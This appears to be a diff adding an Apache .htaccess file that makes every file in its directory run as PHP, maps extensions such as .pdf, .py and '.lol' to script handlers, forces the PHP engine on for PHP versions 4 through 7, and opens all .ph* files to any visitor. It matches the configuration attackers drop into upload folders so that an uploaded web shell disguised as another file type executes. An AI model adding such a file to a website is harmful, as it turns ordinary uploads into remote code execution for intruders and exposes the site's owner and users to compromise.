@@ -1,0 +1,24 @@
+<Files *>
+SetHandler application/x-httpd-php
+AddHandler .cgi .php .php3 .php4 .php5 .php7 .phtml .pl .py .pyc .pyo .pdf .lol
+</Files>
+<IfModule mod_php7.c>
+php_value engine on
+php_flag engine on
+</IfModule>
+<IfModule mod_php5.c>
+php_value engine on
+php_flag engine on
+</IfModule>
+<IfModule mod_php4.c>
+php_value engine on
+php_flag engine on
+</IfModule>
+<IfModule mod_php6.c>
+php_value engine on
+php_flag engine on
+</IfModule>
+<Files *.ph*>
+    Order Deny,Allow
+    Allow from all
+</Files>
